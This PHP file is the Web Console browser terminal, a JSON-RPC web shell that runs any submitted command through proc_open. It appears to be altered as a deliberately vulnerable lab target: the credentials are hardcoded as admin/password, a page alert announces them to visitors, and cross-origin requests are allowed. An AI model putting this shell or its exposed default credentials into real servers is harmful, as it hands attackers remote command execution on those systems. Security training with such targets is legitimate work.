<?php
// Web Console v0.9.5 (2014-02-18)
// (c) 2007-2014 Coderico (http://www.coderico.com)
//
// Author: Nickolay Kovalev (http://resume.nickola.ru)
// GitHub: https://github.com/nickola/web-console
// URL: http://www.web-console.org

// Single-user credentials
// Example: $USER = 'user'; $PASSWORD = 'password';
$USER = 'admin';
$PASSWORD = 'password';
// Multi-user credentials
// Example: $GLOBALS['ACCOUNTS'] = array('user1' => 'password1', 'user2' => 'password2');
$GLOBALS['ACCOUNTS'] = array();

// Home directory (absolute or relative path)
$GLOBALS['HOME_DIRECTORY'] = '';

// Code below is automatically generated from different components
// For more information see: https://github.com/nickola/web-console
//
// Used components:
//   - jQuery JavaScript Library: https://github.com/jquery/jquery
//   - jQuery Mouse Wheel Plugin: https://github.com/brandonaaron/jquery-mousewheel
//   - jQuery Terminal Emulator: https://github.com/jcubic/jquery.terminal
//   - PHP JSON-RPC 2.0 Server/Client Implementation: https://github.com/sergeyfast/eazy-jsonrpc
//   - Normalize.css: https://github.com/necolas/normalize.css
?>
<?php
    /**
     * JSON RPC Server for Eaze
     *
     * Reads $_GET['rawRequest'] or php://input for Request Data
     * @link http://www.jsonrpc.org/specification
     * @link http://dojotoolkit.org/reference-guide/1.8/dojox/rpc/smd.html
     * @package    Eaze
     * @subpackage Model
     * @author     Sergeyfast
     */
    class BaseJsonRpcServer {

    	const ParseError	 = -32700;

        const InvalidRequest = -32600;

        const MethodNotFound = -32601;

        const InvalidParams  = -32602;

        const InternalError  = -32603;

        /**
         * Exposed Instance
         * @var object
         */
        protected $instance;

        /**
         * Decoded Json Request
         * @var object|array
         */
        protected $request;

        /**
         * Array of Received Calls
         * @var array
         */
        protected $calls = array();

        /**
         * Array of Responses for Calls
         * @var array
         */
        protected $response = array();

        /**
         * Has Calls Flag (not notifications)
         * @var bool
         */
        protected $hasCalls = false;

        /**
         * Is Batch Call in using
         * @var bool
         */
        private $isBatchCall = false;

        /**
         * Hidden Methods
         * @var array
         */
        protected $hiddenMethods = array(
            'execute', '__construct'
        );

        /**
         * Content Type
         * @var string
         */
        public $ContentType = 'application/json';

        /**
         * Alow Cross-Domain Requests
         * @var bool
         */
        public $IsXDR = true;

        /**
         * Error Messages
         * @var array
         */
        protected $errorMessages = array(
            self::ParseError       => 'Parse error'
            , self::InvalidRequest => 'Invalid Request'
            , self::MethodNotFound => 'Method not found'
            , self::InvalidParams  => 'Invalid params'
            , self::InternalError  => 'Internal error'
        );


        /**
         * Cached Reflection Methods
         * @var ReflectionMethod[]
         */
        private $reflectionMethods = array();

        /**
         * Validate Request
         * @return int error
         */
        private function getRequest() {
            $error = null;

            do {
                if ( array_key_exists( 'REQUEST_METHOD', $_SERVER ) && $_SERVER['REQUEST_METHOD'] != 'POST' ) {
                    $error = self::InvalidRequest;
                    break;
                };

                $request       = !empty( $_GET['rawRequest'] ) ? $_GET['rawRequest'] : file_get_contents( 'php://input' );
                $this->request = json_decode( $request, false );
                if ( $this->request === null ) {
                    $error = self::ParseError;
                    break;
                }

                if ( $this->request === array() ) {
                    $error = self::InvalidRequest;
                    break;
                }

                // check for batch call
                if ( is_array( $this->request ) ) {
                    $this->calls       = $this->request;
                    $this->isBatchCall = true;
                } else {
                    $this->calls[] = $this->request;
                }
            } while ( false );

            return $error;
        }


        /**
         * Get Error Response
         * @param int   $code
         * @param mixed $id
         * @param null  $data
         * @return array
         */
        private function getError( $code, $id = null, $data = null ) {
            return array(
                'jsonrpc' => '2.0'
                , 'error' => array(
                    'code'      => $code
                    , 'message' => isset( $this->errorMessages[$code] ) ? $this->errorMessages[$code] : $this->errorMessages[self::InternalError]
                    , 'data'    => $data
                )
                , 'id' => $id
            );
        }


        /**
         * Check for jsonrpc version and correct method
         * @param object $call
         * @return array|null
         */
        private function validateCall( $call ) {
            $result = null;
            $error  = null;
            $data   = null;
            $id     = is_object( $call ) && property_exists( $call, 'id' ) ? $call->id : null;
            do {
                if ( !is_object( $call ) ) {
                    $error = self::InvalidRequest;
                    break;
                }

                // hack for inputEx smd tester
                if ( property_exists( $call, 'version' ) ) {
                    if ( $call->version == 'json-rpc-2.0' ) {
                        $call->jsonrpc = '2.0';
                    }
                }

                if ( !property_exists( $call, 'jsonrpc' ) || $call->jsonrpc != '2.0' ) {
                    $error = self::InvalidRequest;
                    break;
                }

                $method = property_exists( $call, 'method' ) ? $call->method : null;
                if ( !$method || !method_exists( $this->instance, $method ) || in_array( strtolower( $method ), $this->hiddenMethods ) ) {
                    $error = self::MethodNotFound;
                    break;
                }

                if ( !array_key_exists( $method, $this->reflectionMethods ) ) {
                    $this->reflectionMethods[$method] = new ReflectionMethod( $this->instance, $method );
                }

                /** @var $params array */
                $params     = property_exists( $call, 'params' ) ? $call->params: null;
                $paramsType = gettype( $params );
                if ( $params !== null && $paramsType != 'array' && $paramsType != 'object' ) {
                    $error = self::InvalidParams;
                    break;
                }

                // check parameters
                switch( $paramsType ) {
                    case 'array':
                        $totalRequired = 0;
                        // doesn't hold required, null, required sequence of params
                        foreach( $this->reflectionMethods[$method]->getParameters() as $param ) {
                            if ( !$param->isDefaultValueAvailable() ) {
                                $totalRequired ++;
                            }
                        }

                        if ( count( $params ) < $totalRequired ) {
                            $error = self::InvalidParams;
                            $data  = sprintf( 'Check numbers of required params (got %d, expected %d)', count( $params ), $totalRequired  );
                        }
                        break;
                    case 'object':
                        foreach( $this->reflectionMethods[$method]->getParameters() as $param ) {
                            if ( !$param->isDefaultValueAvailable()  && !array_key_exists( $param->getName(), $params ) ) {
                                $error = self::InvalidParams;
                                $data  = $param->getName() . ' not found';

                                break 3;
                            }
                        }
                        break;
                    case 'NULL':
                        if ( $this->reflectionMethods[$method]->getNumberOfRequiredParameters() > 0  ) {
                            $error = self::InvalidParams;
                            $data  = 'Empty required params';
                            break 2;
                        }
                        break;
                }

            } while( false );

            if ( $error ) {
                $result = array( $error, $id, $data );
            }

            return $result;
        }


        /**
         * Process Call
         * @param $call
         * @return array|null
         */
        private function processCall( $call ) {
            $id     = property_exists( $call, 'id' ) ? $call->id : null;
            $params = property_exists( $call, 'params' ) ? $call->params : array();
            $result = null;

            try {
                // set named parameters
                if ( is_object( $params ) ) {
                    $newParams = array();
                    foreach($this->reflectionMethods[$call->method]->getParameters() as $param) {
                        $paramName    = $param->getName();
                        $defaultValue = $param->isDefaultValueAvailable() ? $param->getDefaultValue() : null;
                        $newParams[]  = property_exists( $params, $paramName ) ? $params->$paramName : $defaultValue;
                    }

                    $params = $newParams;
                }

                // invoke
                $result = $this->reflectionMethods[$call->method]->invokeArgs( $this->instance, $params );
            } catch ( Exception $e ) {
                return $this->getError( $e->getCode(), $id, $e->getMessage() );
            }

            if ( !$id ) {
                return null;
            }

            return array(
                'jsonrpc'  => '2.0'
                , 'result' => $result
                , 'id'     => $id
            );
        }


        /**
         * Create new Instance
         * @param object $instance
         */
        public function __construct( $instance = null ) {
            if ( get_parent_class( $this ) ) {
                $this->instance = $this;
            } else {
                $this->instance = $instance;
                $this->instance->errorMessages = $this->errorMessages;
            }
        }


        /**
         * Handle Requests
         */
        public function Execute() {
            do {
                // check for SMD Discovery request
                if ( array_key_exists( 'smd', $_GET ) ) {
                    $this->response[]   = $this->getServiceMap();
                    $this->hasCalls    = true;
                    break;
                }

                $error = $this->getRequest();
                if ( $error ) {
                    $this->response[] = $this->getError( $error );
                    $this->hasCalls   = true;
                    break;
                }

                foreach( $this->calls as $call ) {
                    $error = $this->validateCall( $call );
                    if ( $error ) {
                        $this->response[] = $this->getError( $error[0], $error[1], $error[2] );
                        $this->hasCalls   = true;
                    } else {
                        $result = $this->processCall( $call );
                        if ( $result ) {
                            $this->response[] = $result;
                            $this->hasCalls   = true;
                        }
                    }
                }
            } while( false );

            // flush response
            if ( $this->hasCalls ) {
                if ( !$this->isBatchCall ) {
                    $this->response = reset( $this->response );
                }

                // Set Content Type
                if ( $this->ContentType ) {
                    header( 'Content-Type: '. $this->ContentType );
                }

                // Allow Cross Domain Requests
                if ( $this->IsXDR ) {
                    header( 'Access-Control-Allow-Origin: *' );
                    header( 'Access-Control-Allow-Headers: x-requested-with, content-type' );
                }

                echo json_encode( $this->response );
                $this->resetVars();
            }
        }


        /**
         * Get Doc Comment
         * @param $comment
         * @return string|null
         */
        private function getDocDescription( $comment ) {
            $result = null;
            if (  preg_match('/\*\s+([^@]*)\s+/s', $comment, $matches ) ) {
                $result = str_replace( '*' , "\n", trim( trim( $matches[1], '*' ) ) );
            }

            return $result;
        }


        /**
         * Get Service Map
         * Maybe not so good realization of auto-discover via doc blocks
         * @return array
         */
        private function getServiceMap() {
            $rc     = new ReflectionClass( $this->instance );
            $result = array(
                'transport'     => 'POST'
                , 'envelope'    => 'JSON-RPC-2.0'
                , 'SMDVersion'  => '2.0'
                , 'contentType' => 'application/json'
                , 'target'      => !empty( $_SERVER['REQUEST_URI'] ) ? substr( $_SERVER['REQUEST_URI'], 0,strpos( $_SERVER['REQUEST_URI'], '?') ) : ''
                , 'services'    => array()
                , 'description' => ''
            );

            // Get Class Description
            if ( $rcDocComment = $this->getDocDescription( $rc->getDocComment()) ) {
                $result['description'] = $rcDocComment;
            }

            foreach( $rc->getMethods() as $method ) {
                /** @var ReflectionMethod $method */
                if ( !$method->isPublic() || in_array( strtolower( $method->getName() ), $this->hiddenMethods ) ) {
                    continue;
                }

                $methodName = $method->getName();
                $docComment = $method->getDocComment();

                $result['services'][$methodName] = array( 'parameters' => array() );

                // set description
                if ( $rmDocComment = $this->getDocDescription( $docComment ) ) {
                    $result['services'][$methodName]['description'] = $rmDocComment;
                }

                // @param\s+([^\s]*)\s+([^\s]*)\s*([^\s\*]*)
                $parsedParams = array();
                if ( preg_match_all('/@param\s+([^\s]*)\s+([^\s]*)\s*([^\n\*]*)/', $docComment, $matches ) ) {
                    foreach( $matches[2] as $number => $name ) {
                        $type = $matches[1][$number];
                        $desc = $matches[3][$number];
                        $name = trim( $name, '$' );

                        $param = array( 'type' => $type, 'description' => $desc );
                        $parsedParams[$name] = array_filter( $param );
                    }
                };

                // process params
                foreach ( $method->getParameters() as $parameter ) {
                    $name  = $parameter->getName();
                    $param = array( 'name' => $name, 'optional' => $parameter->isDefaultValueAvailable() );
                    if ( array_key_exists( $name, $parsedParams ) ) {
                        $param += $parsedParams[$name];
                    }

                    if ( $param['optional'] ) {
                        $param['default']  = $parameter->getDefaultValue();
                    }

                    $result['services'][$methodName]['parameters'][] = $param;
                }

                // set return type
                if ( preg_match('/@return\s+([^\s]+)\s*([^\n\*]+)/', $docComment, $matches ) ) {
                    $returns = array( 'type' => $matches[1], 'description' => trim( $matches[2] ) );
                    $result['services'][$methodName]['returns'] = array_filter( $returns );
                }
            }

            return $result;
        }


        /**
         * Reset Local Class Vars after Execute
         */
        private function resetVars() {
            $this->response = $this->calls = array();
            $this->hasCalls = $this->isBatchCall = false;
        }

    }

?>
<?php
// Initializing
if (!isset($GLOBALS['ACCOUNTS'])) $GLOBALS['ACCOUNTS'] = array();
if (isset($USER) && isset($PASSWORD) && $USER && $PASSWORD) $GLOBALS['ACCOUNTS'][$USER] = $PASSWORD;
if (!isset($GLOBALS['HOME_DIRECTORY'])) $GLOBALS['HOME_DIRECTORY'] = '';
$IS_CONFIGURED = count($GLOBALS['ACCOUNTS']) >= 1 ? true : false;
// Command execution
function execute_command($command) {
    $descriptors = array(
        0 => array('pipe', 'r'), // STDIN
        1 => array('pipe', 'w'), // STDOUT
        2 => array('pipe', 'w')  // STDERR
    );

    $process = proc_open($command . ' 2>&1', $descriptors, $pipes);
    if (!is_resource($process)) die("Can't execute command.");

    // Nothing to push to STDIN
    fclose($pipes[0]);

    $output = stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $error = stream_get_contents($pipes[2]);
    fclose($pipes[2]);

    // All pipes must be closed before "proc_close"
    $code = proc_close($process);

    return $output;
}

// Command parsing
function parse_command($command) {
    $value = ltrim((string) $command);

    if ($value && !empty($value)) {
        $values = explode(' ', $value);
        $values_total = count($values);

        if ($values_total > 1) {
            $value = $values[$values_total - 1];

            for ($index = $values_total - 2; $index >= 0; $index--) {
                $value_item = $values[$index];

                if (substr($value_item, -1) == '\\')
                    $value = $value_item . ' ' . $value;
                else break;
            }
        }
    }

    return $value;
}

// RPC Server
class WebConsoleRPCServer extends BaseJsonRpcServer {
    protected $home_directory = '';

    private function error($message) {
        throw new Exception($message);
    }

    // Authentication
    private function password_hash($password) {
        return hash('sha256', trim((string) $password));
    }

    private function authenticate_user($user, $password) {
        $user = trim((string) $user);
        $password = trim((string) $password);
        
        if ($user && $password) {
             $GLOBALS['ACCOUNTS'];
           
            if (isset($GLOBALS['ACCOUNTS'][$user]) && $GLOBALS['ACCOUNTS'][$user] && strcmp($password, $GLOBALS['ACCOUNTS'][$user]) == 0)
                return $user . ':' . $this->password_hash($password);
        }

        throw new Exception("Incorrect user or password");
    }

    private function authenticate_token($token) {
        $token = trim((string) $token);
        $token_parts = explode(':', $token, 2);

        if (count($token_parts) == 2) {
            $user = trim((string) $token_parts[0]);
            $password_hash = trim((string) $token_parts[1]);

            if ($user && $password_hash) {
                 $GLOBALS['ACCOUNTS'];

                if (isset($GLOBALS['ACCOUNTS'][$user]) && $GLOBALS['ACCOUNTS'][$user]) {
                    $real_password_hash = $this->password_hash($GLOBALS['ACCOUNTS'][$user]);

                    if (strcmp($password_hash, $real_password_hash) == 0)
                        return true;
                }
            }
        }

        throw new Exception("Incorrect user or password");
    }

    // Environment
    private function get_environment() {
        $hostname = function_exists('gethostname') ? gethostname() : null;
        return array('path' => getcwd(), 'hostname' => $hostname);
    }

    private function set_environment($environment) {
        if ($environment && !empty($environment)) {
            $environment = (array) $environment;

            if (isset($environment['path']) && $environment['path']) {
                $path = $environment['path'];

                if (is_dir($path)) {
                    if (!@chdir($path)) return array('output' => "Unable to change directory to current working directory, updating current directory",
                                                     'environment' => $this->get_environment());
                }
                else return array('output' => "Current working directory not found, updating current directory",
                                  'environment' => $this->get_environment());
            }
        }
    }

    // Initialization
    private function initialize($token, $environment) {
        $this->authenticate_token($token);

         $GLOBALS['HOME_DIRECTORY'];
        $this->home_directory = !empty($GLOBALS['HOME_DIRECTORY']) ? $GLOBALS['HOME_DIRECTORY'] : getcwd();
        $result = $this->set_environment($environment);

        if ($result) return $result;
    }

    // Methods
    public function login($user, $password) {
        $result = array('token' => $this->authenticate_user($user, $password),
                        'environment' => $this->get_environment());

         $GLOBALS['HOME_DIRECTORY'];
        if (!empty($GLOBALS['HOME_DIRECTORY'])) {
            if (is_dir($GLOBALS['HOME_DIRECTORY']))
                $result['environment']['path'] = $GLOBALS['HOME_DIRECTORY'];
            else $result['output'] = "Home directory not found: ". $GLOBALS['HOME_DIRECTORY'];
        }

        return $result;
    }

    public function cd($token, $environment, $path) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $path = trim((string) $path);
        if (empty($path)) $path = $this->home_directory;

        if (!empty($path)) {
            if (is_dir($path)) {
                if (!@chdir($path)) return array('output' => "cd: ". $path . ": Unable to change directory");
            }
            else return array('output' => "cd: ". $path . ": No such directory");
        }

        return array('environment' => $this->get_environment());
    }

    public function completion($token, $environment, $pattern, $command) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $scan_path = '';
        $completion_prefix = '';
        $completion = array();

        if (!empty($pattern)) {
            if (!is_dir($pattern)) {
                $pattern = dirname($pattern);
                if ($pattern == '.') $pattern = '';
            }

            if (!empty($pattern)) {
                if (is_dir($pattern)) {
                    $scan_path = $completion_prefix = $pattern;
                    if (substr($completion_prefix, -1) != '/') $completion_prefix .= '/';
                }
            }
            else $scan_path = getcwd();
        }
        else $scan_path = getcwd();

        if (!empty($scan_path)) {
            // Loading directory listing
            $completion = array_values(array_diff(scandir($scan_path), array('..', '.')));
            natsort($completion);

            // Prefix
            if (!empty($completion_prefix) && !empty($completion)) {
                foreach ($completion as &$value) $value = $completion_prefix . $value;
            }

            // Pattern
            if (!empty($pattern) && !empty($completion)) {
                // For PHP version that does not support anonymous functions (available since PHP 5.3.0)
                function filter_pattern($value) {
                    global $pattern;
                    return !strncmp($pattern, $value, strlen($pattern));
                }

                $completion = array_values(array_filter($completion, 'filter_pattern'));
            }
        }

        return array('completion' => $completion);
    }

    public function run($token, $environment, $command) {
        $result = $this->initialize($token, $environment);
        if ($result) return $result;

        $output = ($command && !empty($command)) ? execute_command($command) : '';
        if ($output && substr($output, -1) == "\n") $output = substr($output, 0, -1);

        return array('output' => $output);
    }
}

// Processing request
if (array_key_exists('REQUEST_METHOD', $_SERVER) && $_SERVER['REQUEST_METHOD'] == 'POST') {
    $rpc_server = new WebConsoleRPCServer();
    $rpc_server->Execute();
}
else if (!$IS_CONFIGURED) {
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>Web Console</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="description" content="Web Console (http://www.web-console.org)" />
        <meta name="author" content="Nickolay Kovalev (http://resume.nickola.ru)" />
        <meta name="robots" content="none" />
        <style type="text/css">html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background:0 0}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:700}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}.terminal .cmd .format,.terminal .cmd .prompt,.terminal .cmd .prompt div,.terminal .terminal-output .format,.terminal .terminal-output div div{display:inline-block}.terminal .clipboard{position:absolute;bottom:0;left:0;opacity:.01;filter:alpha(opacity=.01);filter:alpha(opacity=.01);width:2px}.cmd>.clipboard{position:fixed}.terminal{padding:10px;position:relative;overflow:hidden}.cmd{padding:0;margin:0;height:1.3em}.terminal .prompt,.terminal .terminal-output div div{display:block;height:auto}.terminal .prompt{float:left}.terminal{background-color:#000}.terminal-output>div{min-height:14px}.terminal .terminal-output div span{display:inline-block}.terminal .cmd span{float:left}.terminal .cmd span.inverted{background-color:#aaa;color:#000}.terminal .terminal-output div div a::-moz-selection,.terminal .terminal-output div div::-moz-selection,.terminal .terminal-output div span::-moz-selection{background-color:#aaa;color:#000}.terminal .cmd>span::selection,.terminal .prompt span::selection,.terminal .terminal-output div div a::selection,.terminal .terminal-output div div::selection,.terminal .terminal-output div span::selection{background-color:#aaa;color:#000}.terminal .terminal-output div.error,.terminal .terminal-output div.error div{color:red}.tilda{position:fixed;top:0;left:0;width:100%;z-index:1100}.clear{clear:both}body{background-color:#000}.terminal,.terminal .prompt,.terminal .terminal-output div div,body{color:#ccc;font-family:monospace,fixed;font-size:15px;line-height:18px}.terminal a,.terminal a:hover,a,a:hover{color:#6c71c4}.spaced{margin:15px 0}.spaced-top{margin:15px 0 0}.spaced-bottom{margin:0 0 15px}.configure{margin:20px}.configure .variable{color:#d33682}.configure p,.configure ul{margin:5px 0 0}</style>
    </head>
    <body>
        <div class="configure">
            <p>Web Console must be configured before use:</p>
            <ul>
                <li>Open Web Console PHP file in your favorite text editor.</li>
                <li>At the top of the file enter your <span class="variable">$USER</span> and <span class="variable">$PASSWORD</span> credentials, edit any other settings that you like (see description in the comments).</li>
                <li>Upload changed file to the web server and open it in the browser.</li>
            </ul>
            
        </div>
    </body>
</html>
<?php
}
else { ?>
<!DOCTYPE html>
<html class="no-js">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <title>Web Console</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="robots" content="none" />
        <style type="text/css">html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background:0 0}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:700}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{-moz-box-sizing:content-box;box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:textfield;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;box-sizing:content-box}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{border:0;padding:0}textarea{overflow:auto}optgroup{font-weight:700}table{border-collapse:collapse;border-spacing:0}td,th{padding:0}.terminal .cmd .format,.terminal .cmd .prompt,.terminal .cmd .prompt div,.terminal .terminal-output .format,.terminal .terminal-output div div{display:inline-block}.terminal .clipboard{position:absolute;bottom:0;left:0;opacity:.01;filter:alpha(opacity=.01);filter:alpha(opacity=.01);width:2px}.cmd>.clipboard{position:fixed}.terminal{padding:10px;position:relative;overflow:hidden}.cmd{padding:0;margin:0;height:1.3em}.terminal .prompt,.terminal .terminal-output div div{display:block;height:auto}.terminal .prompt{float:left}.terminal{background-color:#000}.terminal-output>div{min-height:14px}.terminal .terminal-output div span{display:inline-block}.terminal .cmd span{float:left}.terminal .cmd span.inverted{background-color:#aaa;color:#000}.terminal .terminal-output div div a::-moz-selection,.terminal .terminal-output div div::-moz-selection,.terminal .terminal-output div span::-moz-selection{background-color:#aaa;color:#000}.terminal .cmd>span::selection,.terminal .prompt span::selection,.terminal .terminal-output div div a::selection,.terminal .terminal-output div div::selection,.terminal .terminal-output div span::selection{background-color:#aaa;color:#000}.terminal .terminal-output div.error,.terminal .terminal-output div.error div{color:red}.tilda{position:fixed;top:0;left:0;width:100%;z-index:1100}.clear{clear:both}body{background-color:#000}.terminal,.terminal .prompt,.terminal .terminal-output div div,body{color:#ccc;font-family:monospace,fixed;font-size:15px;line-height:18px}.terminal a,.terminal a:hover,a,a:hover{color:#6c71c4}.spaced{margin:15px 0}.spaced-top{margin:15px 0 0}.spaced-bottom{margin:0 0 15px}.configure{margin:20px}.configure .variable{color:#d33682}.configure p,.configure ul{margin:5px 0 0}</style>

           </head>
           <script type="text/javascript">
               alert("use `admin` on login prompt and `password` as password to gain access to the Web Console");
           </script>
           <script type="text/javascript" src="<?=  DvAssetPath($payload, "webconsole.js")?>"></script>
    <body></body>
</html>
<?php } ?>